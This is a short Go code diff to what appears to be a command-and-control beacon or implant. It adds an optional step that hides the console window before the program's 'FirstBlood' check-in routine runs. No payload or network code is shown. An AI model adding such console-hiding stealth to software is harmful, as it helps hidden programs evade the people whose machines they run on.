@@ -3,6 +3,7 @@ package main
 import (
 	"bytes"
 	"errors"
+	"fmt"
 	"main/config"
 	"main/crypt"
 	"main/packet"
@@ -13,7 +14,14 @@ import (
 )
 
 func main() {
-
+	if config.HideConsole {
+		dataConsole, errConsole := packet.HideConsole()
+		if errConsole != nil {
+			fmt.Println(errConsole)
+		} else {
+			fmt.Println(dataConsole)
+		}
+	}
 	ok := packet.FirstBlood()
 	if ok {
 		var Token uintptr
